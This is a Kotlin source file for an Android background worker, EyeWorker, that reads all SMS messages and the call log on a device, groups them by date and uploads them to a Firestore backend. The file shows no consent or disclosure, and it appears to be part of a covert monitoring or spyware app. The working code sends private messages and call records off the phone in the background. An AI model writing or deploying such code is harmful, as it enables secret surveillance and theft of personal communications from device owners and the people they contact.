package com.eye.service

import android.content.Context
import android.os.Build
import androidx.annotation.RequiresApi
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.eye.di.HiltEntryPoint
import com.eye.utils.EyeDetails.readCallLog
import com.eye.utils.EyeDetails.readSMS
import dagger.hilt.android.EntryPointAccessors
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class EyeWorker(private val context: Context, params: WorkerParameters) : Worker(context, params) {

    @RequiresApi(Build.VERSION_CODES.O)
    override fun doWork(): Result {
        try {
            println("workerLive")
            val hiltEntryPoint =
                EntryPointAccessors.fromApplication(context, HiltEntryPoint::class.java)
            val firestoreRepository = hiltEntryPoint.firestoreRepository()

            CoroutineScope(SupervisorJob()).launch {
                val smsReader = context.readSMS().groupBy {
                    it.date
                }
                if (smsReader != null) {
                    firestoreRepository.uploadSMSLog(smsReader)
                }

                val callLogs = context.readCallLog()?.groupBy {
                    it.date
                }

                if (callLogs != null) {
                    firestoreRepository.uploadCallLog(callLogs)
                }
            }
            return Result.success()
        } catch (e: Exception) {
            e.printStackTrace()
            return Result.retry()
        }

    }


}